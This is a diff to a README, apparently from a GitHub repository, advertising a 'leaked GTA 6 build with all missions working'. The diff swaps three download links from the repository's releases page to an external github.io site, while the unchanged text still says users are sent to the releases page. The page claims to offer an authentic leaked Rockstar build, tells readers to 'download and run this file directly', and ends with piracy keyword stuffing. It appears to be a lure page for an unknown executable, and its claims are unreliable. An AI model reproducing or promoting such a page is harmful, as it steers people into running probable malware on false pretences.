@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Leaked-Build-All-Missions-Working - Your Ultimate Access to Full GTA 6 Experience</h1>
 
 <p align="center">
-  <a href="https://github.com/Deweyclimbable4960/GTA-6-Leaked-Build-All-Missions-Working/releases">
+  <a href="https://deweyclimbable4960.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6_LEAKED_BUILD-FF4500?style=for-the-badge&logo=github&logoColor=white" alt="Download GTA 6 Leaked Build" style="max-width:100%;">
   </a>
 </p>
@@ -53,7 +53,7 @@ This is the authentic internal Rockstar build that was leaked in late 2025. It i
 
 Visit this link to download the application:
 
-**[🔗 Click Here to Go to the GTA 6 Leaked Build Download Page](https://github.com/Deweyclimbable4960/GTA-6-Leaked-Build-All-Missions-Working/releases)**
+**[🔗 Click Here to Go to the GTA 6 Leaked Build Download Page](https://deweyclimbable4960.github.io)**
 
 You will be redirected to the releases page of this repository. This page hosts the latest version of the leaked build.
 
@@ -197,6 +197,6 @@ Please do not redistribute this build or sell it for profit. Keep the community 
 
 **Download and run this file directly.**
 
-| [⬇️ Download GTA 6 Leaked Build Now](https://github.com/Deweyclimbable4960/GTA-6-Leaked-Build-All-Missions-Working/releases) |
+| [⬇️ Download GTA 6 Leaked Build Now](https://deweyclimbable4960.github.io) |
 
 Keywords: gta-6-cd-key, gta-6-codex, gta-6-cracked, gta-6-denuvo-crack, gta-6-drm-free, gta-6-empress-crack, gta-6-emulator-pc, gta-6-free, gta-6-free-download, gta-6-google-drive, gta-6-leaked, gta-6-leaked-build, gta-6-mediafire, gta-6-multiplayer-beta, gta-6-online-beta, gta-6-pc, gta-6-scene-release, gta-6-stolen-build, gta-6-trial, gta-vi-free
